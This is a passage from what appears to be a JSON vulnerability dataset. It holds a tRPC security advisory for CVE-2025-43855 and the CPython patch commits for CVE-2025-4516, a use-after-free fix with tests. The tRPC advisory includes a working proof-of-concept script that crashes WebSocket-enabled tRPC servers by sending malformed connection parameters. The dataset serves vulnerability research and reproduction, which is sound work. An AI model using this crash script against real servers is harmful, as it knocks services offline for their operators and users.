00:00:00 2001\nFrom: Luke Childs <lukechilds123@gmail.com>\nDate: Sun, 20 Apr 2025 13:27:10 +0700\nSubject: [PATCH] Don't throw already handled error\n\nThis error has already been handled so no need to re-throw. If we re-throw it will not be caught and will trigger an uncaught exception causing the entire server process to crash.\n---\n packages/server/src/adapters/ws.ts | 2 --\n 1 file changed, 2 deletions(-)\n\ndiff --git a/packages/server/src/adapters/ws.ts b/packages/server/src/adapters/ws.ts\nindex ad869affd..5a578b5cb 100644\n--- a/packages/server/src/adapters/ws.ts\n+++ b/packages/server/src/adapters/ws.ts\n@@ -167,8 +167,6 @@ export function getWSConnectionHandler<TRouter extends AnyRouter>(\n         (globalThis.setImmediate ?? globalThis.setTimeout)(() => {\n           client.close();\n         });\n-\n-        throw error;\n       });\n     }\n\n--\n2.48.1\nPoC\nThis script will crash the target tRPC 11 server if WebSockets are enabled:\n#!/usr/bin/env node\n\nconst TARGET = 'ws://localhost:3000'\n\n// These malicious connection params will crash any tRPC v11.1.0 WebSocket server on validation\nconst MALICIOUS_CONNECTION_PARAMS = JSON.stringify({\n  method: \"connectionParams\",\n  data: { invalidConnectionParams: null },\n});\n\n// Open a connection to the target\nconst target = `${TARGET}?connectionParams=1`;\nconsole.log(`Opening a WebSocket to ${target}`);\nconst socket = new WebSocket(target);\n\n// Wait for the connection to be established\nsocket.addEventListener(\"open\", () => {\n  console.log(\"WebSocket established!\");\n\n  // Sends a message to the WebSocket server.\n  console.log(`Sending malicious connectionParams`);\n  socket.send(MALICIOUS_CONNECTION_PARAMS);\n  console.log(`Done!`);\n});\n\n// Handle errors\nsocket.addEventListener(\"error\", () => console.log(\"Error opening WebSocket\"));\nComplete PoC with vulnerable WebSocket server here: https://github.com/lukechilds/trpc-vuln-reproduction\nSeverity\nHigh\n8.7\n/ 10\nCVSS v4 base metrics\nExploitability Metrics\nAttack Vector\nNetwork\nAttack Complexity\nLow\nAttack Requirements\nNone\nPrivileges Required\nNone\nUser interaction\nNone\nVulnerable System Impact Metrics\nConfidentiality\nNone\nIntegrity\nNone\nAvailability\nHigh\nSubsequent System Impact Metrics\nConfidentiality\nNone\nIntegrity\nNone\nAvailability\nNone\nLearn more about base metrics\nCVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N\nCVE ID\nCVE-2025-43855\nWeaknesses\nNo CWEs\nCredits\nlukechilds\nReporter\nFooter\n\u00a9 2025 GitHub, Inc.\nFooter navigation\nTerms\nPrivacy\nSecurity\nStatus\nDocs\nContact\nManage cookies\nDo not share my personal information",
                "effective": true,
                "effective_reason": "The advisory includes specific scripts and descriptions that recreate the described vulnerability.",
                "url": "https://github.com/trpc/trpc/security/advisories/GHSA-pj3v-9cm8-gvj8"
            }
        ],
        "sw_version": "v11.0.0",
        "sw_version_wget": "https://github.com/trpc/trpc/archive/refs/tags/v11.0.0.zip"
    },
    "CVE-2025-4516": {
        "cwe": [
            {
                "id": "CWE-416",
                "value": "CWE-416 Use After Free"
            }
        ],
        "description": "There is an issue in CPython when using `bytes.decode(\"unicode_escape\", error=\"ignore|replace\")`. If you are not using the \"unicode_escape\" encoding or an error handler your usage is not affected. To work-around this issue you may stop using the error= handler and instead wrap the bytes.decode() call in a try-except catching the DecodeError.",
        "languages": [
            "Python",
            "C"
        ],
        "patch_commits": [
            {
                "content": "[3.14] gh-133767: Fix use-after-free in the unicode-escape decoder with an error handler (GH-129648) (GH-133942)\n\nIf the error handler is used, a new bytes object is created to set as\nthe object attribute of UnicodeDecodeError, and that bytes object then\nreplaces the original data. A pointer to the decoded data will became invalid\nafter destroying that temporary bytes object. So we need other way to return\nthe first invalid escape from _PyUnicode_DecodeUnicodeEscapeInternal().\n\n_PyBytes_DecodeEscape() does not have such issue, because it does not\nuse the error handlers registry, but it should be changed for compatibility\nwith _PyUnicode_DecodeUnicodeEscapeInternal().\n(cherry picked from commit 9f69a58623bd01349a18ba0c7a9cb1dad6a51e8e)\n\nCo-authored-by: Serhiy Storchaka <storchaka@gmail.com>\n\nFilename: Doc/data/python3.14.abi:\n```\n@@ -1130,7 +1130,6 @@\n<elf-symbol name='_PyBytesWriter_Prepare' type='func-type' binding='global-binding' visibility='default-visibility' is-defined='yes'/>\n     <elf-symbol name='_PyBytesWriter_Resize' type='func-type' binding='global-binding' visibility='default-visibility' is-defined='yes'/>\n     <elf-symbol name='_PyBytesWriter_WriteBytes' type='func-type' binding='global-binding' visibility='default-visibility' is-defined='yes'/>\n-    <elf-symbol name='_PyBytes_DecodeEscape' type='func-type' binding='global-binding' visibility='default-visibility' is-defined='yes'/>\n     <elf-symbol name='_PyBytes_Find' type='func-type' binding='global-binding' visibility='default-visibility' is-defined='yes'/>\n     <elf-symbol name='_PyBytes_FromData' type='func-type' binding='global-binding' visibility='default-visibility' is-defined='yes'/>\n     <elf-symbol name='_PyBytes_FromXIData' type='func-type' binding='global-binding' visibility='default-visibility' is-defined='yes'/>\n\n@@ -1448,7 +1447,6 @@\n<elf-symbol name='_PyUnicode_AsUTF8String' type='func-type' binding='global-binding' visibility='default-visibility' is-defined='yes'/>\n     <elf-symbol name='_PyUnicode_CheckConsistency' type='func-type' binding='global-binding' visibility='default-visibility' is-defined='yes'/>\n     <elf-symbol name='_PyUnicode_Copy' type='func-type' binding='global-binding' visibility='default-visibility' is-defined='yes'/>\n-    <elf-symbol name='_PyUnicode_DecodeUnicodeEscapeInternal' type='func-type' binding='global-binding' visibility='default-visibility' is-defined='yes'/>\n     <elf-symbol name='_PyUnicode_EncodeUTF16' type='func-type' binding='global-binding' visibility='default-visibility' is-defined='yes'/>\n     <elf-symbol name='_PyUnicode_EncodeUTF32' type='func-type' binding='global-binding' visibility='default-visibility' is-defined='yes'/>\n     <elf-symbol name='_PyUnicode_Equal' type='func-type' binding='global-binding' visibility='default-visibility' is-defined='yes'/>\n\n@@ -24180,21 +24178,6 @@\n<parameter type-id='type-id-6'/>\n       <return type-id='type-id-5'/>\n     </function-decl>\n-    <function-decl name='_PyBytes_DecodeEscape' mangled-name='_PyBytes_DecodeEscape' filepath='./Include/internal/pycore_bytesobject.h' line='23' column='1' visibility='default' binding='global' size-in-bits='64' elf-symbol-id='_PyBytes_DecodeEscape'>\n-      <parameter type-id='type-id-4'/>\n-      <parameter type-id='type-id-7'/>\n-      <parameter type-id='type-id-4'/>\n-      <parameter type-id='type-id-266'/>\n-      <return type-id='type-id-6'/>\n-    </function-decl>\n-    <function-decl name='_PyUnicode_DecodeUnicodeEscapeInternal' mangled-name='_PyUnicode_DecodeUnicodeEscapeInternal' filepath='./Include/internal/pycore_unicodeobject.h' line='142' column='1' visibility='default' binding='global' size-in-bits='64' elf-symbol-id='_PyUnicode_DecodeUnicodeEscapeInternal'>\n-      <parameter type-id='type-id-4'/>\n-      <parameter type-id='type-id-7'/>\n-      <parameter type-id='type-id-4'/>\n-      <parameter type-id='type-id-8'/>\n-      <parameter type-id='type-id-266'/>\n-      <return type-id='type-id-6'/>\n-    </function-decl>\n     <function-decl name='_PyErr_BadInternalCall' mangled-name='_PyErr_BadInternalCall' filepath='./Include/pyerrors.h' line='223' column='1' visibility='default' binding='global' size-in-bits='64' elf-symbol-id='_PyErr_BadInternalCall'>\n       <parameter type-id='type-id-4'/>\n       <parameter type-id='type-id-5'/>\n```\n\nFilename: Include/internal/pycore_bytesobject.h:\n```\n@@ -20,8 +20,9 @@\nextern PyObject* _PyBytes_FromHex(\n \n // Helper for PyBytes_DecodeEscape that detects invalid escape chars.\n // Export for test_peg_generator.\n-PyAPI_FUNC(PyObject*) _PyBytes_DecodeEscape(const char *, Py_ssize_t,\n-                                            const char *, const char **);\n+PyAPI_FUNC(PyObject*) _PyBytes_DecodeEscape2(const char *, Py_ssize_t,\n+                                             const char *,\n+                                             int *, const char **);\n \n \n // Substring Search.\n```\n\nFilename: Include/internal/pycore_unicodeobject.h:\n```\n@@ -139,14 +139,18 @@\nextern PyObject* _PyUnicode_DecodeUnicodeEscapeStateful(\n // Helper for PyUnicode_DecodeUnicodeEscape that detects invalid escape\n // chars.\n // Export for test_peg_generator.\n-PyAPI_FUNC(PyObject*) _PyUnicode_DecodeUnicodeEscapeInternal(\n+PyAPI_FUNC(PyObject*) _PyUnicode_DecodeUnicodeEscapeInternal2(\n     const char *string,     /* Unicode-Escape encoded string */\n     Py_ssize_t length,      /* size of string */\n     const char *errors,     /* error handling */\n     Py_ssize_t *consumed,   /* bytes consumed */\n-    const char **first_invalid_escape); /* on return, points to first\n-                                           invalid escaped char in\n-                                           string. */\n+    int *first_invalid_escape_char, /* on return, if not -1, contain the first\n+                                       invalid escaped char (<= 0xff) or invalid\n+                                       octal escape (> 0xff) in string. */\n+    const char **first_invalid_escape_ptr); /* on return, if not NULL, may\n+                                        point to the first invalid escaped\n+                                        char in string.\n+                                        May be NULL if errors is not NULL. */\n \n /* --- Raw-Unicode-Escape Codecs ---------------------------------------------- */\n```\n\nFilename: Lib/test/test_codeccallbacks.py:\n```\n@@ -2,6 +2,7 @@\nimport codecs\n import html.entities\n import itertools\n+import re\n import sys\n import unicodedata\n import unittest\n\n@@ -1125,7 +1126,7 @@\ndef test_bug828737(self):\n             text = 'abc<def>ghi'*n\n             text.translate(charmap)\n \n-    def test_mutatingdecodehandler(self):\n+    def test_mutating_decode_handler(self):\n         baddata = [\n             (\"ascii\", b\"\\xff\"),\n             (\"utf-7\", b\"++\"),\n\n@@ -1160,6 +1161,42 @@\ndef mutating(exc):\n         for (encoding, data) in baddata:\n             self.assertEqual(data.decode(encoding, \"test.mutating\"), \"\\u4242\")\n \n+    def test_mutating_decode_handler_unicode_escape(self):\n+        decode = codecs.unicode_escape_decode\n+        def mutating(exc):\n+            if isinstance(exc, UnicodeDecodeError):\n+                r = data.get(exc.object[:exc.end])\n+                if r is not None:\n+                    exc.object = r[0] + exc.object[exc.end:]\n+                    return ('\\u0404', r[1])\n+            raise AssertionError(\"don't know how to handle %r\" % exc)\n+\n+        codecs.register_error('test.mutating2', mutating)\n+        data = {\n+            br'\\x0': (b'\\\\', 0),\n+            br'\\x3': (b'xxx\\\\', 3),\n+            br'\\x5': (b'x\\\\', 1),\n+        }\n+        def check(input, expected, msg):\n+            with self.assertWarns(DeprecationWarning) as cm:\n+                self.assertEqual(decode(input, 'test.mutating2'), (expected, len(input)))\n+            self.assertIn(msg, str(cm.warning))\n+\n+        check(br'\\x0n\\z', '\\u0404\\n\\\\z', r'\"\\z\" is an invalid escape sequence')\n+        check(br'\\x0n\\501', '\\u0404\\n\\u0141', r'\"\\501\" is an invalid octal escape sequence')\n+        check(br'\\x0z', '\\u0404\\\\z', r'\"\\z\" is an invalid escape sequence')\n+\n+        check(br'\\x3n\\zr', '\\u0404\\n\\\\zr', r'\"\\z\" is an invalid escape sequence')\n+        check(br'\\x3zr', '\\u0404\\\\zr', r'\"\\z\" is an invalid escape sequence')\n+        check(br'\\x3z5', '\\u0404\\\\z5', r'\"\\z\" is an invalid escape sequence')\n+        check(memoryview(br'\\x3z5x')[:-1], '\\u0404\\\\z5', r'\"\\z\" is an invalid escape sequence')\n+        check(memoryview(br'\\x3z5xy')[:-2], '\\u0404\\\\z5', r'\"\\z\" is an invalid escape sequence')\n+\n+        check(br'\\x5n\\z', '\\u0404\\n\\\\z', r'\"\\z\" is an invalid escape sequence')\n+        check(br'\\x5n\\501', '\\u0404\\n\\u0141', r'\"\\501\" is an invalid octal escape sequence')\n+        check(br'\\x5z', '\\u0404\\\\z', r'\"\\z\" is an invalid escape sequence')\n+        check(memoryview(br'\\x5zy')[:-1], '\\u0404\\\\z', r'\"\\z\" is an invalid escape sequence')\n+\n     # issue32583\n     def test_crashing_decode_handler(self):\n         # better generating one more character to fill the extra space slot\n```\n\nFilename: Lib/test/test_codecs.py:\n```\n@@ -1196,23 +1196,39 @@\ndef test_escape(self):\n         check(br\"[\\1010]\", b\"[A0]\")\n         check(br\"[\\x41]\", b\"[A]\")\n         check(br\"[\\x410]\", b\"[A0]\")\n+\n+    def test_warnings(self):\n+        decode = codecs.escape_decode\n+        check = coding_checker(self, decode)\n         for i in range(97, 123):\n             b = bytes([i])\n             if b not in b'abfnrtvx':\n-                with self.assertWarns(DeprecationWarning):\n+                with self.assertWarnsRegex(DeprecationWarning,\n+                        r'\"\\\\%c\" is an invalid escape sequence' % i):\n                     check(b\"\\\\\" + b, b\"\\\\\" + b)\n-            with self.assertWarns(DeprecationWarning):\n+            with self.assertWarnsRegex(DeprecationWarning,\n+                    r'\"\\\\%c\" is an invalid escape sequence' % (i-32)):\n                 check(b\"\\\\\" + b.upper(), b\"\\\\\" + b.upper())\n-        with self.assertWarns(DeprecationWarning):\n+        with self.assertWarnsRegex(DeprecationWarning,\n+                r'\"\\\\8\" is an invalid escape sequence'):\n             check(br\"\\8\", b\"\\\\8\")\n         with self.assertWarns(DeprecationWarning):\n             check(br\"\\9\", b\"\\\\9\")\n-        with self.assertWarns(DeprecationWarning):\n+        with self.assertWarnsRegex(DeprecationWarning,\n+                r'\"\\\\\\xfa\" is an invalid escape sequence') as cm:\n             check(b\"\\\\\\xfa\", b\"\\\\\\xfa\")\n         for i in range(0o400, 0o1000):\n-            with self.assertWarns(DeprecationWarning):\n+            with self.assertWarnsRegex(DeprecationWarning,\n+                    r'\"\\\\%o\" is an invalid octal escape sequence' % i):\n                 check(rb'\\%o' % i, bytes([i & 0o377]))\n \n+        with self.assertWarnsRegex(DeprecationWarning,\n+                r'\"\\\\z\" is an invalid escape sequence'):\n+            self.assertEqual(decode(br'\\x\\z', 'ignore'), (b'\\\\z', 4))\n+        with self.assertWarnsRegex(DeprecationWarning,\n+                r'\"\\\\501\" is an invalid octal escape sequence'):\n+            self.assertEqual(decode(br'\\x\\501', 'ignore'), (b'A', 6))\n+\n     def test_errors(self):\n         decode = codecs.escape_decode\n         self.assertRaises(ValueError, decode, br\"\\x\")\n\n@@ -2661,24 +2677,40 @@\ndef test_escape_decode(self):\n         check(br\"[\\x410]\", \"[A0]\")\n         check(br\"\\u20ac\", \"\\u20ac\")\n         check(br\"\\U0001d120\", \"\\U0001d120\")\n+\n+    def test_decode_warnings(self):\n+        decode = codecs.unicode_escape_decode\n+        check = coding_checker(self, decode)\n         for i in range(97, 123):\n             b = bytes([i])\n             if b not in b'abfnrtuvx':\n-                with self.assertWarns(DeprecationWarning):\n+                with self.assertWarnsRegex(DeprecationWarning,\n+                        r'\"\\\\%c\" is an invalid escape sequence' % i):\n                     check(b\"\\\\\" + b, \"\\\\\" + chr(i))\n             if b.upper() not in b'UN':\n-                with self.assertWarns(DeprecationWarning):\n+                with self.assertWarnsRegex(DeprecationWarning,\n+                        r'\"\\\\%c\" is an invalid escape sequence' % (i-32)):\n                     check(b\"\\\\\" + b.upper(), \"\\\\\" + chr(i-32))\n-        with self.assertWarns(DeprecationWarning):\n+        with self.assertWarnsRegex(DeprecationWarning,\n+                r'\"\\\\8\" is an invalid escape sequence'):\n             check(br\"\\8\", \"\\\\8\")\n         with self.assertWarns(DeprecationWarning):\n             check(br\"\\9\", \"\\\\9\")\n-        with self.assertWarns(DeprecationWarning):\n+        with self.assertWarnsRegex(DeprecationWarning,\n+                r'\"\\\\\\xfa\" is an invalid escape sequence') as cm:\n             check(b\"\\\\\\xfa\", \"\\\\\\xfa\")\n         for i in range(0o400, 0o1000):\n-            with self.assertWarns(DeprecationWarning):\n+            with self.assertWarnsRegex(DeprecationWarning,\n+                    r'\"\\\\%o\" is an invalid octal escape sequence' % i):\n                 check(rb'\\%o' % i, chr(i))\n \n+        with self.assertWarnsRegex(DeprecationWarning,\n+                r'\"\\\\z\" is an invalid escape sequence'):\n+            self.assertEqual(decode(br'\\x\\z', 'ignore'), ('\\\\z', 4))\n+        with self.assertWarnsRegex(DeprecationWarning,\n+                r'\"\\\\501\" is an invalid octal escape sequence'):\n+            self.assertEqual(decode(br'\\x\\501', 'ignore'), ('\\u0141', 6))\n+\n     def test_decode_errors(self):\n         decode = codecs.unicode_escape_decode\n         for c, d in (b'x', 2), (b'u', 4), (b'U', 4):\n```\n\nFilename: Misc/NEWS.d/next/Security/2025-05-09-20-22-54.gh-issue-133767.kN2i3Q.rst:\n```\n@@ -0,0 +1,2 @@\n+Fix use-after-free in the \"unicode-escape\" decoder with a non-\"strict\" error\n+handler.\n```\n\nFilename: Objects/bytesobject.c:\n```\n@@ -1075,10 +1075,11 @@\n_PyBytes_FormatEx(const char *format, Py_ssize_t format_len,\n }\n \n /* Unescape a backslash-escaped string. */\n-PyObject *_PyBytes_DecodeEscape(const char *s,\n+PyObject *_PyBytes_DecodeEscape2(const char *s,\n                                 Py_ssize_t len,\n                                 const char *errors,\n-                                const char **first_invalid_escape)\n+                                int *first_invalid_escape_char,\n+                                const char **first_invalid_escape_ptr)\n {\n     int c;\n     char *p;\n\n@@ -1092,7 +1093,8 @@\nPyObject *_PyBytes_DecodeEscape(const char *s,\n         return NULL;\n     writer.overallocate = 1;\n \n-    *first_invalid_escape = NULL;\n+    *first_invalid_escape_char = -1;\n+    *first_invalid_escape_ptr = NULL;\n \n     end = s + len;\n     while (s < end) {\n\n@@ -1130,9 +1132,10 @@\nPyObject *_PyBytes_DecodeEscape(const char *s,\n                     c = (c<<3) + *s++ - '0';\n             }\n             if (c > 0377) {\n-                if (*first_invalid_escape == NULL) {\n-                    *first_invalid_escape = s-3; /* Back up 3 chars, since we've\n-                                                    already incremented s. */\n+                if (*first_invalid_escape_char == -1) {\n+                    *first_invalid_escape_char = c;\n+                    /* Back up 3 chars, since we've already incremented s. */\n+                    *first_invalid_escape_ptr = s - 3;\n                 }\n             }\n             *p++ = c;\n\n@@ -1173,9 +1176,10 @@\nPyObject *_PyBytes_DecodeEscape(const char *s,\n             break;\n \n         default:\n-            if (*first_invalid_escape == NULL) {\n-                *first_invalid_escape = s-1; /* Back up one char, since we've\n-                                                already incremented s. */\n+            if (*first_invalid_escape_char == -1) {\n+                *first_invalid_escape_char = (unsigned char)s[-1];\n+                /* Back up one char, since we've already incremented s. */\n+                *first_invalid_escape_ptr = s - 1;\n             }\n             *p++ = '\\\\';\n             s--;\n\n@@ -1195,18 +1199,19 @@\nPyObject *PyBytes_DecodeEscape(const char *s,\n                                 Py_ssize_t Py_UNUSED(unicode),\n                                 const char *Py_UNUSED(recode_encoding))\n {\n-    const char* first_invalid_escape;\n-    PyObject *result = _PyBytes_DecodeEscape(s, len, errors,\n-                                             &first_invalid_escape);\n+    int first_invalid_escape_char;\n+    const char *first_invalid_escape_ptr;\n+    PyObject *result = _PyBytes_DecodeEscape2(s, len, errors,\n+                                             &first_invalid_escape_char,\n+                                             &first_invalid_escape_ptr);\n     if (result == NULL)\n         return NULL;\n-    if (first_invalid_escape != NULL) {\n-        unsigned char c = *first_invalid_escape;\n-        if ('4' <= c && c <= '7') {\n+    if (first_invalid_escape_char != -1) {\n+        if (first_invalid_escape_char > 0xff) {\n             if (PyErr_WarnFormat(PyExc_DeprecationWarning, 1,\n-                                 \"b\\\"\\\\%.3s\\\" is an invalid octal escape sequence. \"\n+                                 \"b\\\"\\\\%o\\\" is an invalid octal escape sequence. \"\n                                  \"Such sequences will not work in the future. \",\n-                                 first_invalid_escape) < 0)\n+                                 first_invalid_escape_char) < 0)\n             {\n                 Py_DECREF(result);\n                 return NULL;\n\n@@ -1216,7 +1221,7 @@\nPyObject *PyBytes_DecodeEscape(const char *s,\n             if (PyErr_WarnFormat(PyExc_DeprecationWarning, 1,\n                                  \"b\\\"\\\\%c\\\" is an invalid escape sequence. \"\n                                  \"Such sequences will not work in the future. \",\n-                                 c) < 0)\n+                                 first_invalid_escape_char) < 0)\n             {\n                 Py_DECREF(result);\n                 return NULL;\n```\n\nFilename: Objects/unicodeobject.c:\n```\n@@ -6621,21 +6621,24 @@\n_PyUnicode_GetNameCAPI(void)\n /* --- Unicode Escape Codec ----------------------------------------------- */\n \n PyObject *\n-_PyUnicode_DecodeUnicodeEscapeInternal(const char *s,\n+_PyUnicode_DecodeUnicodeEscapeInternal2(const char *s,\n                                Py_ssize_t size,\n                                const char *errors,\n                                Py_ssize_t *consumed,\n-                               const char **first_invalid_escape)\n+                               int *first_invalid_escape_char,\n+                               const char **first_invalid_escape_ptr)\n {\n     const char *starts = s;\n+    const char *initial_starts = starts;\n     _PyUnicodeWriter writer;\n     const char *end;\n     PyObject *errorHandler = NULL;\n     PyObject *exc = NULL;\n     _PyUnicode_Name_CAPI *ucnhash_capi;\n \n     // so we can remember if we've seen an invalid escape char or not\n-    *first_invalid_escape = NULL;\n+    *first_invalid_escape_char = -1;\n+    *first_invalid_escape_ptr = NULL;\n \n     if (size == 0) {\n         if (consumed) {\n\n@@ -6723,9 +6726,12 @@\n_PyUnicode_DecodeUnicodeEscapeInternal(const char *s,\n                 }\n             }\n             if (ch > 0377) {\n-                if (*first_invalid_escape == NULL) {\n-                    *first_invalid_escape = s-3; /* Back up 3 chars, since we've\n-                                                    already incremented s. */\n+                if (*first_invalid_escape_char == -1) {\n+                    *first_invalid_escape_char = ch;\n+                    if (starts == initial_starts) {\n+                        /* Back up 3 chars, since we've already incremented s. */\n+                        *first_invalid_escape_ptr = s - 3;\n+                    }\n                 }\n             }\n             WRITE_CHAR(ch);\n\n@@ -6820,9 +6826,12 @@\n_PyUnicode_DecodeUnicodeEscapeInternal(const char *s,\n             goto error;\n \n         default:\n-            if (*first_invalid_escape == NULL) {\n-                *first_invalid_escape = s-1; /* Back up one char, since we've\n-                                                already incremented s. */\n+            if (*first_invalid_escape_char == -1) {\n+                *first_invalid_escape_char = c;\n+                if (starts == initial_starts) {\n+                    /* Back up one char, since we've already incremented s. */\n+                    *first_invalid_escape_ptr = s - 1;\n+                }\n             }\n             WRITE_ASCII_CHAR('\\\\');\n             WRITE_CHAR(c);\n\n@@ -6867,19 +6876,20 @@\n_PyUnicode_DecodeUnicodeEscapeStateful(const char *s,\n                               const char *errors,\n                               Py_ssize_t *consumed)\n {\n-    const char *first_invalid_escape;\n-    PyObject *result = _PyUnicode_DecodeUnicodeEscapeInternal(s, size, errors,\n+    int first_invalid_escape_char;\n+    const char *first_invalid_escape_ptr;\n+    PyObject *result = _PyUnicode_DecodeUnicodeEscapeInternal2(s, size, errors,\n                                                       consumed,\n-                                                      &first_invalid_escape);\n+                                                      &first_invalid_escape_char,\n+                                                      &first_invalid_escape_ptr);\n     if (result == NULL)\n         return NULL;\n-    if (first_invalid_escape != NULL) {\n-        unsigned char c = *first_invalid_escape;\n-        if ('4' <= c && c <= '7') {\n+    if (first_invalid_escape_char != -1) {\n+        if (first_invalid_escape_char > 0xff) {\n             if (PyErr_WarnFormat(PyExc_DeprecationWarning, 1,\n-                                 \"\\\"\\\\%.3s\\\" is an invalid octal escape sequence. \"\n+                                 \"\\\"\\\\%o\\\" is an invalid octal escape sequence. \"\n                                  \"Such sequences will not work in the future. \",\n-                                 first_invalid_escape) < 0)\n+                                 first_invalid_escape_char) < 0)\n             {\n                 Py_DECREF(result);\n                 return NULL;\n\n@@ -6889,7 +6899,7 @@\n_PyUnicode_DecodeUnicodeEscapeStateful(const char *s,\n             if (PyErr_WarnFormat(PyExc_DeprecationWarning, 1,\n                                  \"\\\"\\\\%c\\\" is an invalid escape sequence. \"\n                                  \"Such sequences will not work in the future. \",\n-                                 c) < 0)\n+                                 first_invalid_escape_char) < 0)\n             {\n                 Py_DECREF(result);\n                 return NULL;\n```\n\nFilename: Parser/string_parser.c:\n```\n@@ -196,15 +196,18 @@\ndecode_unicode_with_escapes(Parser *parser, const char *s, size_t len, Token *t)\n     len = (size_t)(p - buf);\n     s = buf;\n \n-    const char *first_invalid_escape;\n-    v = _PyUnicode_DecodeUnicodeEscapeInternal(s, (Py_ssize_t)len, NULL, NULL, &first_invalid_escape);\n+    int first_invalid_escape_char;\n+    const char *first_invalid_escape_ptr;\n+    v = _PyUnicode_DecodeUnicodeEscapeInternal2(s, (Py_ssize_t)len, NULL, NULL,\n+                                                &first_invalid_escape_char,\n+                                                &first_invalid_escape_ptr);\n \n     // HACK: later we can simply pass the line no, since we don't preserve the tokens\n     // when we are decoding the string but we preserve the line numbers.\n-    if (v != NULL && first_invalid_escape != NULL && t != NULL) {\n-        if (warn_invalid_escape_sequence(parser, s, first_invalid_escape, t) < 0) {\n-            /* We have not decref u before because first_invalid_escape points\n-               inside u. */\n+    if (v != NULL && first_invalid_escape_ptr != NULL && t != NULL) {\n+        if (warn_invalid_escape_sequence(parser, s, first_invalid_escape_ptr, t) < 0) {\n+            /* We have not decref u before because first_invalid_escape_ptr\n+               points inside u. */\n             Py_XDECREF(u);\n             Py_DECREF(v);\n             return NULL;\n\n@@ -217,14 +220,17 @@\ndecode_unicode_with_escapes(Parser *parser, const char *s, size_t len, Token *t)\n static PyObject *\n decode_bytes_with_escapes(Parser *p, const char *s, Py_ssize_t len, Token *t)\n {\n-    const char *first_invalid_escape;\n-    PyObject *result = _PyBytes_DecodeEscape(s, len, NULL, &first_invalid_escape);\n+    int first_invalid_escape_char;\n+    const char *first_invalid_escape_ptr;\n+    PyObject *result = _PyBytes_DecodeEscape2(s, len, NULL,\n+                                              &first_invalid_escape_char,\n+                                              &first_invalid_escape_ptr);\n     if (result == NULL) {\n         return NULL;\n     }\n \n-    if (first_invalid_escape != NULL) {\n-        if (warn_invalid_escape_sequence(p, s, first_invalid_escape, t) < 0) {\n+    if (first_invalid_escape_ptr != NULL) {\n+        if (warn_invalid_escape_sequence(p, s, first_invalid_escape_ptr, t) < 0) {\n             Py_DECREF(result);\n             return NULL;\n         }\n```",
                "url": "https://github.com/python/cpython/commit/69b4387f78f413e8c47572a85b3478c47eba8142"
            },
            {
                "content": "gh-133767: Fix use-after-free in the unicode-escape decoder with an error handler (GH-129648)\n\nIf the error handler is used, a new bytes object is created to set as\nthe object attribute of UnicodeDecodeError, and that bytes object then\nreplaces the original data. A pointer to the decoded data will became invalid\nafter destroying that temporary bytes object. So we need other way to return\nthe first invalid escape from _PyUnicode_DecodeUnicodeEscapeInternal().\n\n_PyBytes_DecodeEscape() does not have such issue, because it does not\nuse the error handlers registry, but it should be changed for compatibility\nwith _PyUnicode_DecodeUnicodeEscapeInternal().\n\nFilename: Include/internal/pycore_bytesobject.h:\n```\n@@ -20,8 +20,9 @@\nextern PyObject* _PyBytes_FromHex(\n \n // Helper for PyBytes_DecodeEscape that detects invalid escape chars.\n // Export for test_peg_generator.\n-PyAPI_FUNC(PyObject*) _PyBytes_DecodeEscape(const char *, Py_ssize_t,\n-                                            const char *, const char **);\n+PyAPI_FUNC(PyObject*) _PyBytes_DecodeEscape2(const char *, Py_ssize_t,\n+                                             const char *,\n+                                             int *, const char **);\n \n \n // Substring Search.\n```\n\nFilename: Include/internal/pycore_unicodeobject.h:\n```\n@@ -139,14 +139,18 @@\nextern PyObject* _PyUnicode_DecodeUnicodeEscapeStateful(\n // Helper for PyUnicode_DecodeUnicodeEscape that detects invalid escape\n // chars.\n // Export for test_peg_generator.\n-PyAPI_FUNC(PyObject*) _PyUnicode_DecodeUnicodeEscapeInternal(\n+PyAPI_FUNC(PyObject*) _PyUnicode_DecodeUnicodeEscapeInternal2(\n     const char *string,     /* Unicode-Escape encoded string */\n     Py_ssize_t length,      /* size of string */\n     const char *errors,     /* error handling */\n     Py_ssize_t *consumed,   /* bytes consumed */\n-    const char **first_invalid_escape); /* on return, points to first\n-                                           invalid escaped char in\n-                                           string. */\n+    int *first_invalid_escape_char, /* on return, if not -1, contain the first\n+                                       invalid escaped char (<= 0xff) or invalid\n+                                       octal escape (> 0xff) in string. */\n+    const char **first_invalid_escape_ptr); /* on return, if not NULL, may\n+                                        point to the first invalid escaped\n+                                        char in string.\n+                                        May be NULL if errors is not NULL. */\n \n /* --- Raw-Unicode-Escape Codecs ---------------------------------------------- */\n```\n\nFilename: Lib/test/test_codeccallbacks.py:\n```\n@@ -2,6 +2,7 @@\nimport codecs\n import html.entities\n import itertools\n+import re\n import sys\n import unicodedata\n import unittest\n\n@@ -1125,7 +1126,7 @@\ndef test_bug828737(self):\n             text = 'abc<def>ghi'*n\n             text.translate(charmap)\n \n-    def test_mutatingdecodehandler(self):\n+    def test_mutating_decode_handler(self):\n         baddata = [\n             (\"ascii\", b\"\\xff\"),\n             (\"utf-7\", b\"++\"),\n\n@@ -1160,6 +1161,42 @@\ndef mutating(exc):\n         for (encoding, data) in baddata:\n             self.assertEqual(data.decode(encoding, \"test.mutating\"), \"\\u4242\")\n \n+    def test_mutating_decode_handler_unicode_escape(self):\n+        decode = codecs.unicode_escape_decode\n+        def mutating(exc):\n+            if isinstance(exc, UnicodeDecodeError):\n+                r = data.get(exc.object[:exc.end])\n+                if r is not None:\n+                    exc.object = r[0] + exc.object[exc.end:]\n+                    return ('\\u0404', r[1])\n+            raise AssertionError(\"don't know how to handle %r\" % exc)\n+\n+        codecs.register_error('test.mutating2', mutating)\n+        data = {\n+            br'\\x0': (b'\\\\', 0),\n+            br'\\x3': (b'xxx\\\\', 3),\n+            br'\\x5': (b'x\\\\', 1),\n+        }\n+        def check(input, expected, msg):\n+            with self.assertWarns(DeprecationWarning) as cm:\n+                self.assertEqual(decode(input, 'test.mutating2'), (expected, len(input)))\n+            self.assertIn(msg, str(cm.warning))\n+\n+        check(br'\\x0n\\z', '\\u0404\\n\\\\z', r'\"\\z\" is an invalid escape sequence')\n+        check(br'\\x0n\\501', '\\u0404\\n\\u0141', r'\"\\501\" is an invalid octal escape sequence')\n+        check(br'\\x0z', '\\u0404\\\\z', r'\"\\z\" is an invalid escape sequence')\n+\n+        check(br'\\x3n\\zr', '\\u0404\\n\\\\zr', r'\"\\z\" is an invalid escape sequence')\n+        check(br'\\x3zr', '\\u0404\\\\zr', r'\"\\z\" is an invalid 